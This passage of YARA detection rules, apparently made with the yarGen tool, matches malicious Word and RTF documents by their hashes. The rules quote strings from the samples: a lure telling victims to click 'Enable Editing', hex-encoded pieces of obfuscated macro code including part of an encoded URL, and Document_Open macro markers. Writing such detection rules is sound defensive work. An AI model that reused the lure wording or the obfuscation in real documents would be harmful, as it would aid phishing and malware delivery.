      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash3 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "\\lsdpriority49 \\lsdlocked0 List Table 5 Colorful 5;\\lsdpriority50 \\lsdlocked0 List Table 5 Dark Accent 5;\\lsdpriority51 \\l" ascii
      $s2 = "\\lsdpriority50 \\lsdlocked0 List Table 5 Dark Accent 6;\\lsdpriority51 \\lsdlocked0 List Table 6 Colorful Accent 6;\\lsdpriorit" ascii
      $s3 = "\\lsdpriority49 \\lsdlocked0 List Table 5 Colorful 5;\\lsdpriority50 \\lsdlocked0 List Table 5 Dark Accent 5;\\lsdpriority51 \\l" ascii
      $s4 = "\\lsdpriority50 \\lsdlocked0 List Table 5 Dark Accent 6;\\lsdpriority51 \\lsdlocked0 List Table 6 Colorful Accent 6;\\lsdpriorit" ascii
      $s5 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading 6;\\ldppimEMihiddenn3 \\lsdunhideused1 " ascii
      $s6 = "Microsoft Office does not work in email Preview.\\line Please download the document and click {\\b Enable Editing} when opening." ascii
      $s7 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading 8;\\ldppimEMihiddenn3 \\lsdunhideused2 " ascii
      $s8 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat3 \\lsdpriority9 \\lsdlocked0 heading 2;\\ldppimEMihiddenn3 \\lsdunhideused1 " ascii
      $s9 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading 6;\\ldppimEMihiddenn3 \\lsdunhideused1 " ascii
      $s10 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat3 \\lsdpriority9 \\lsdlocked0 heading 2;\\ldppimEMihiddenn3 \\lsdunhideused1 " ascii
      $s11 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading 8;\\ldppimEMihiddenn3 \\lsdunhideused2 " ascii
      $s12 = "at2 \\lsdpriority9 \\lsdlocked0 heading 3;\\ldppimEMihiddenn3 \\lsdunhideused1 \\lzdqformat2 \\lsdpriority9 \\lsdlocked0 heading" ascii
      $s13 = "at2 \\lsdpriority9 \\lsdlocked0 heading 9;\\ldppimEMihiddenn3 \\lsdunhxckeused1" fullword ascii
      $s14 = "at2 \\lsdpriority9 \\lsdlocked0 heading 6;\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading" ascii
      $s15 = "446767665c \\lsepriority9 \\lsdlocked0 heading 1;" fullword ascii
      $s16 = "1010D01010E0F02010101090A0002010101010101010101010410020101010101010410020101010104100201010101010101010101010101010D01010E0F020" ascii
      $s17 = "10116000000000C0101160B01090A07080410020101090A0204100201010E191401041002010101010116000000000C010410020101090A020116000000000C0" ascii
      $s18 = "10020101090A0201010101010101010410000000000B01010101090A020101010600000002010104201F00000708010410020101090A02010101010101010100" ascii
      $s19 = "01041002010101010101010101010101010101090A0B0101091D14090A0201010410020101090A02010410020101010104100201010E19140101010101010101" ascii
      $s20 = "8010410020101010104100002010410020101010101010101010101010410020104100002010410020410121401160708041000020104100204100201010E191" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead_2 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash3 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash4 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s2 = "07f0b9ebebe9eedff11227ef8f9d8e27bfb7bcfcf0151bfdbfccb4fd567f9dbed3f4992244992e467d3ff0d2eefffb138ff6e5e7369eefeee5ee5bf588d17cdf" ascii
      $s3 = "eb568bee2f97bb6ffe3febfe73ef6fe48ffecbefb7c3eff0779bf3918e779fe187f1e4cfc8ef5b9cfb3cf8f19fd3e7b9f0fe31ee42fe6ffd7d7977c4b746c28e" ascii
      $s4 = "8f2d7c89fe0edc182e23378f323fe99fc23fd4c7c4b3f131f11f12f207f0cdefc68fe16f4d1f9d781e71fe947e76fee3e0c96bff2b9df5f4c7e3d7d8c3f0f2f3" ascii
      $s5 = "f5ffff57e24fef8d9c86bdf85b5717d82159fc1d3c878f7ee43febfee37e683892fecfb8fc567f333efeb10595bf0fb6797fed5fec77b3fdbff51ffcc7e9f587" ascii
      $s6 = "8feb0bfe9fe6de2eff9f341d0f3c3e8d735567cfdc2b3f513cee775efbeff913fe49fc94fcfe9b72e38e7e6fde6f54e89ffced76befebd54db2fde9637e9c4e5" ascii
      $s7 = "e1c8c76d3f3fd70f119028f8538dfebc24e62c66fc3c6fd7e644dd5be92d8e83e149fc1f3e78d3971c6fe10feeb7eb2ee7cc143d3c6dfe13f129ff1e7edc182e" ascii
      $s8 = "b7edbd85de87950eff51e68cf8e66b8c4e3fd2de9eb68f1193c7f9385bdd507f9bfe7e3ece7526339be4ce2f1913fe17c36f7b0e94ce65fc1ef9f9dfe355df1f" ascii
      $s9 = "9b2c8ed3f09f85f8f3fe16f89f8fe7eff6cd4bfd4ff38feb3fd1ff5ffe9fec4f32b741ee69f3f25863e6721feeef95f24d65f517ddfb87ef1f918eb4f44bcbeb" ascii
      $s10 = "930ee41fe907e263f0d79bf71d0e23378fe50fd06f27e73dbef7e86fb476332ff0ecf3e9f5e345df1fc3ddbff51ffdf531f7b7fe47f56df7d3e9fff83bcdf1c8" ascii
      $s11 = "2fc50c67f6dfc1f42fb77d47e1251fd9f5e1f05c57f5edfbfbeffd3f111d1f87f7bfe32bfcff2697f59df6741fee2e33f9d9fee2feeffd3ebe3e0f84febfbd7f" ascii
      $s12 = "ffff0408a0802d0104080408a080f08105080408a0802d0102080408a080f08106080708a080fc0208a08080808a080a0408a0802d0105080408a0802d010308" ascii
      $s13 = "d7f99df67f9b4bfecefb3207d31fde08b9db279fb0340e38f07793f2e2874e3c38f1f7563c74bff612282d78f6cf5e1b9c46cd1e7c68fc2e8f7eeb3e05f7ecce" ascii
      $s14 = "f1c8e3f8ee8fd78b2d08d0f3feed88d1d2ffd8717096eff4518814bcc167d6efc288c7eef3e0bfee5c72e2f8bdcfe9380fff5f813fe9688efeff7cf46fd4bfd8" ascii
      $s15 = "dd17141e6e4fde664e17e184f63b43ee4ffbcdf1844d6169e7d3e5556fb1feffd6cff47fd33eb7d62f5898e4bc8e8f34762e4fdc6c69b13d3ceef5f7f3e3efbf" ascii
      $s16 = "a0808420ffff0108a080a080a080a0808308a080a080a080a080a08408a0830408a08308a080a08408a0830408a08408a080a08408a0830408a08508a0808f08" ascii
      $s17 = "080a080a080a0108a080208a0808108a080feffffff08a080a080a080a0fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" ascii
      $s18 = "080a080a080a080a080a080a080a080a080a080a08308a080a080a080a080a080a080a080a080ffffffffffffffffffffffff08a080a080a080a080a080a080a" ascii
      $s19 = "3bd7ef12e17bff1eff68dfbf5c89eee75e5e218d587e23378feb43127ce581fc27fdd4fd69d2ff8ff14b4f177f88fc467fc697bb0e0f83394757dff44f5cb9e5" ascii
      $s20 = "e9fe5d3feb2becf82f445c77f3e3fdd5f54ffe7d74741f19fd6f7efefff747c4434fedf9ebfccefb37cde5fd6f75990be987ef0c54ed9bcfd01e0f1c783bc1f1" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625_d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf651_3 {
   meta:
      description = "DOC - from files 8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625.docx, d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625"
      hash2 = "d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f"
   strings:
      $s1 = " HYPERLINK \"http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm\" " fullword wide
      $s2 = "http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm" fullword wide
      $s3 = ": dvtu.customs.ru/index.php?option=com_content&view=category&id=80 " fullword wide
      $s4 = "r Eastern regions of Russia and the countries of the Korean peninsula. There were revealed reasons for the slowing of economic c" ascii
      $s5 = "ooperation. It is concluded that the international economic sanctions did not reduce the interest of the Korean states in cooper" ascii
      $s6 = ". 225-226]. " fullword wide /* hex encoded string '"R&' */
      $s7 = "4870605,7" fullword wide /* hex encoded string 'Hp`W' */
      $s8 = "Keywords: Russia " fullword ascii
      $s9 = " Republic of Korea " fullword ascii
      $s10 = " HYPERLINK \"http://minvr.ru/press-center/news/5330\" " fullword wide
      $s11 = "http://minvr.ru/press-center/news/5330" fullword wide
      $s12 = " HYPERLINK \"http://minvr.ru/press-center/news/1171/?sphrase_id=323653\" " fullword wide
      $s13 = "http://minvr.ru/press-center/news/1171/?sphrase_id=323653" fullword wide
      $s14 = " trade and economic relations " fullword ascii
      $s15 = "ShellV" fullword ascii
      $s16 = " investments" fullword ascii
      $s17 = "The Regional Economic Contacts of Russian Far East with Korean States (2010s)" fullword wide
      $s18 = "  + 1,2" fullword wide
      $s19 = " North Korea " fullword ascii
      $s20 = "$Customliz" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625_7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f_4 {
   meta:
      description = "DOC - from files 8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625.docx, 7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a.docx, d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625"
      hash2 = "7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a"
      hash3 = "d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f"
   strings:
      $s1 = "<a:clrMap xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" bg1=\"lt1\" tx1=\"dk1\" bg2=\"lt2\" tx2=\"dk2\" acce" ascii
      $s2 = "Documentj" fullword ascii
      $s3 = "Project1" fullword ascii
      $s4 = "Word.Document.8" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "Macros" fullword wide /* Goodware String - occured 29 times */
      $s6 = "_VBA_PROJECT" fullword wide /* Goodware String - occured 30 times */
      $s7 = "PROJECTwm" fullword wide /* Goodware String - occured 30 times */
      $s8 = "DocumentSummaryInformation" fullword wide /* Goodware String - occured 41 times */
      $s9 = "SummaryInformation" fullword wide /* Goodware String - occured 50 times */
      $s10 = "WordDocument" fullword wide /* Goodware String - occured 52 times */
      $s11 = "Project-" fullword ascii
      $s12 = "Document_Open" fullword ascii
      $s13 = "t1\" accent2=\"accent2\" accent3=\"accent3\" accent4=\"accent4\" accent5=\"accent5\" accent6=\"accent6\" hlink=\"hlink\" folHlin" ascii
      $s14 = "lateDeri" fullword ascii
      $s15 = "ThisDocument<" fullword ascii
      $s16 = "VGlobal!" fullword ascii
      $s17 = "Name=\"Project\"" fullword ascii
      $s18 = "_Evaluate" fullword ascii /* Goodware String - occured 1 times */
      $s19 = "Microsoft Word 97-2003 Document" fullword ascii
      $s20 = "Footer Char" fullword wide
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd1_5 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "35347662347866673679787967627975363772666769626766" ascii /* hex encoded string '54vb4xfg6yxygbyu67rfgibgf' */
      $s2 = "343633342B353633343635342D333938333635362F32373436" ascii /* hex encoded string '4634+5634654-3983656/2746' */
      $s3 = "20206B6A7373647975667364663772656967203D206B6A7373" ascii /* hex encoded string '  kjssdyufsdf7reig = kjss' */
      $s4 = "73646664736673203D20226148523055446F764C3268316448" ascii /* hex encoded string 'sdfdsfs = "aHR0UDovL2h1dH' */
      $s5 = "342A283334363337383533342D333436333734292B34383334" ascii /* hex encoded string '4*(346378534-346374)+4834' */
      $s6 = "626E667237203D202239333933393537333734332A33343336" ascii /* hex encoded string 'bnfr7 = "93939573743*3436' */
      $s7 = "373538393635343635342B3433343333372A34353633343533" ascii /* hex encoded string '7589654654+434337*4563453' */
      $s8 = "0043003b005c00660061006b00650070006100740048005c00610062006400740066006800670058004700680067006800670068009c002e0053006300740013" ascii
      $s9 = "80067006800670068009c002e00530063007400C6AFABEC197FD211978E0000F8757E2a000000000000000000000000000000000000000000000000FFFFFFFF0" ascii
      $s10 = "000F00050054004D00700025005c00610062006400740066006800670058006700680067006800670068009c002e00530063007400C6AFABEC197FD211978E" ascii
      $s11 = "0000000C000000000000046020000000303000000000000c00000000000004600001A00000025544D50255c61626474666867686764676867689c2e534354000" ascii
      $s12 = "35220D0A202020207436373666747466373534766234786667" ascii
      $s13 = "764676867689c2e536354" ascii
      $s14 = "0054004D00700025005c00610062006400740066006800670058006700680067006800670068009c002e00530063007400C6" ascii
      $s15 = "41626374666867586764676867689c2e536354" ascii
      $s16 = "000433a5c43626b65706144555c61626474666867686" ascii
      $s17 = "676867689c2e536354000000030020000000433a5c43626b65706144555c61626474666867686" ascii
      $s18 = "433a5c6A736473546767665c61626474666867584764676867689c2e536354" ascii
      $s19 = "00610062006300740066006800670058006700680067006800670068009c002e005300630074001f" ascii
      $s20 = "0433a5c43626b65706144555c61626474666867686" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619_e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead_6 {
   meta:
      description = "DOC - from files 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash2 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash3 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "666769626766626E667237203D202239333933393537333734" ascii /* hex encoded string 'fgibgfbnfr7 = "9393957374' */
      $s2 = "332A33343336343633342B353633343635342D333938333635" ascii /* hex encoded string '3*34364634+5634654-398365' */
      $s3 = "362F32373436373538393635343635342B3433343333372A34" ascii /* hex encoded string '6/27467589654654+434337*4' */
      $s4 = "353633343533342A283334363337383533342D333436333734" ascii /* hex encoded string '5634534*(346378534-346374' */
      $s5 = "36667474663735347662347866673679787967627975363772" ascii /* hex encoded string '6fttf754vb4xfg6yxygbyu67r' */
      $s6 = "0043003b005c00660061006b00650070006100740048005c00610062006400740066006800670058004700680067006800670068009d002e0053006300740013" ascii
      $s7 = "80067006800670068009d002e00530063007400C6AFABEC197FD211978E0000F8757E2a000000000000000000000000000000000000000000000000FFFFFFFF0" ascii
      $s8 = "000F00050054004D00700025005c00610062006400740066006800670058006700680067006800670068009d002e00530063007400C6AFABEC197FD211978E" ascii
      $s9 = "0000000C000000000000046020000000303000000000000c00000000000004600001A00000025544D50255c61626474666867686764676867689d2e534354000" ascii
      $s10 = "25544D50255c61626474666867686764676867689d2e534354" ascii
      $s11 = "676867689d2e536354000000030020000000433a5c43626b65706144775c61626474666867686" ascii
      $s12 = "0054004D00700025005c00610062006400740066006800670058006700680067006800670068009d002e00530063007400C6" ascii
      $s13 = "433a5c6A736473546767665c61626474666867584764676867689d2e536354" ascii
      $s14 = "000433a5c43626b65706144775c61626474666867686" ascii
      $s15 = "764676867689d2e536354" ascii
      $s16 = "00610062006300740066006800670058006700680067006800670068009d002e005300630074001f" ascii
      $s17 = "0025544D50255c61626474666867686764676867689d2e534354000E00ADDE" ascii
      $s18 = "0433a5c43626b65706144775c61626474666867686" ascii
      $s19 = "61626474666867586764676867689d2e536354" ascii
      $s20 = "0043003a005c00440061006b00650070006100550048005c00610062006400740066006800670058006700680067006800670068009d002e0053006300740001" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_7 {
   meta:
      description = "DOC - from files e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "343635342B3433343333372A34353633343533342A28333436" ascii /* hex encoded string '4654+434337*45634534*(346' */
      $s2 = "3772656967203D206B6A737364797566736466377265696720" ascii /* hex encoded string '7reig = kjssdyufsdf7reig ' */
      $s3 = "373436373538393635343635342B3433343333372A34353633" ascii /* hex encoded string '7467589654654+434337*4563' */
      $s4 = "66673679787967627975363772666769626766626E66723720" ascii /* hex encoded string 'fg6yxygbyu67rfgibgfbnfr7 ' */
      $s5 = "2A33343336343633342B353633343635342D33393833363536" ascii /* hex encoded string '*34364634+5634654-3983656' */
      $s6 = "2F32373436373538393635343635342B3433343333372A3435" ascii /* hex encoded string '/27467589654654+434337*45' */
      $s7 = "6769626766626E667237203D20223933393339353733373433" ascii /* hex encoded string 'gibgfbnfr7 = "93939573743' */
      $s8 = "343336343633342B353633343635342D333938333635362F32" ascii /* hex encoded string '4364634+5634654-3983656/2' */
      $s9 = "7866673679787967627975363772666769626766626E667237" ascii /* hex encoded string 'xfg6yxygbyu67rfgibgfbnfr7' */
      $s10 = "343533342A283334363337383533342D333436333734292B34" ascii /* hex encoded string '4534*(346378534-346374)+4' */
      $s11 = "203D202239333933393537333734332A33343336343633342B" ascii /* hex encoded string ' = "93939573743*34364634+' */
      $s12 = "3633343635342D333938333635362F32373436373538393635" ascii /* hex encoded string '634654-3983656/2746758965' */
      $s13 = "66747466373534766234786667367978796762797536377266" ascii /* hex encoded string 'fttf754vb4xfg6yxygbyu67rf' */
      $s14 = "3D202239333933393537333734332A33343336343633342B35" ascii /* hex encoded string '= "93939573743*34364634+5' */
      $s15 = "3633343533342A283334363337383533342D33343633373429" ascii /* hex encoded string '634534*(346378534-346374)' */
      $s16 = "626766626E667237203D202239333933393537333734332A33" ascii /* hex encoded string 'bgfbnfr7 = "93939573743*3' */
      $s17 = "35343635342B3433343333372A34353633343533342A283334" ascii /* hex encoded string '54654+434337*45634534*(34' */
      $s18 = "74663735347662347866673679787967627975363772666769" ascii /* hex encoded string 'tf754vb4xfg6yxygbyu67rfgi' */
      $s19 = "353633343635342D333938333635362F323734363735383936" ascii /* hex encoded string '5634654-3983656/274675896' */
      $s20 = "2B3438333435220D0A20202020743637366674746637353476" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0_8 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash3 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "72666769626766626E667237203D2022393339333935373337" ascii /* hex encoded string 'rfgibgfbnfr7 = "939395737' */
      $s2 = "372A34353633343533342A283334363337383533342D333436" ascii /* hex encoded string '7*45634534*(346378534-346' */
      $s3 = "333635362F32373436373538393635343635342B3433343333" ascii /* hex encoded string '3656/27467589654654+43433' */
      $s4 = "37366674746637353476623478666736797879676279753637" ascii /* hex encoded string '76fttf754vb4xfg6yxygbyu67' */
      $s5 = "343635342D333938333635362F323734363735383936353436" ascii /* hex encoded string '4654-3983656/274675896546' */
      $s6 = "3679787967627975363772666769626766626E667237203D20" ascii /* hex encoded string '6yxygbyu67rfgibgfbnfr7 = ' */
      $s7 = "363772666769626766626E667237203D202239333933393537" ascii /* hex encoded string '67rfgibgfbnfr7 = "9393957' */
      $s8 = "34353633343533342A283334363337383533342D3334363337" ascii /* hex encoded string '45634534*(346378534-34637' */
      $s9 = "333734332A33343336343633342B353633343635342D333938" ascii /* hex encoded string '3743*34364634+5634654-398' */
      $s10 = "74363736667474663735347662347866673679787967627975" ascii /* hex encoded string 't676fttf754vb4xfg6yxygbyu' */
      $s11 = "202020202020202020206B6A73736479756673646637726569" ascii /* hex encoded string '          kjssdyufsdf7rei' */
      $s12 = "34332A33343336343633342B353633343635342D3339383336" ascii /* hex encoded string '43*34364634+5634654-39836' */
      $s13 = "35342B3433343333372A34353633343533342A283334363337" ascii /* hex encoded string '54+434337*45634534*(34637' */
      $s14 = "2239333933393537333734332A33343336343633342B353633" ascii /* hex encoded string '"93939573743*34364634+563' */
      $s15 = "35362F32373436373538393635343635342B3433343333372A" ascii /* hex encoded string '56/27467589654654+434337*' */
      $s16 = "383533342D333436333734292B3438333435220D0A20202020" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4_8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb73_9 {
   meta:
      description = "DOC - from files f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4.xlsx, 8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e.xlsx, 41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4"
      hash2 = "8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e"
      hash3 = "41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085"
   strings:
      $s1 = "EncryptedPackage2" fullword wide
      $s2 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* Goodware String - occured 153 times */
      $s3 = "StrongEncryptionDataSpace" fullword wide /* Goodware String - occured 1 times */
      $s4 = "Microsoft.Container.EncryptionTransform" fullword wide /* Goodware String - occured 1 times */
      $s5 = "{FF9A3F03-56EF-4613-BDD5-5A41C1D07246}N" fullword wide
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 4000KB and ( all of them )
      ) or ( all of them )
}

rule _199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c_7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7d_10 {
   meta:
      description = "DOC - from files 199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c.doc, 7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c"
      hash2 = "7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc"
   strings:
      $s1 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s2 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s7 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s9 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "word/styles.xml" fullword ascii /* Goodware String - occured 5 times */
      $s12 = "word/document.xml" fullword ascii /* Goodware String - occured 5 times */
      $s13 = "word/fontTable.xml" fullword ascii /* Goodware String - occured 5 times */
      $s14 = "word/settings.xml" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a_d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf651_11 {
   meta:
      description = "DOC - from files 7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a.docx, d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a"
      hash2 = "d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f"
   strings:
      $s1 = "omation" fullword ascii
      $s2 = "ENormal" fullword ascii
      $s3 = "e2.tlb" fullword ascii
      $s4 = "\\G{00020" fullword ascii
      $s5 = "\\Windows" fullword ascii /* Goodware String - occured 4 times */
      $s6 = "D04C-5BF" fullword ascii
      $s7 = "2.0#0#C:" fullword ascii
      $s8 = "#OLE Aut" fullword ascii
      $s9 = "! Offic" fullword ascii
      $s10 = "A-101B-BHDE5" fullword ascii
      $s11 = "!G{2DF8" fullword ascii
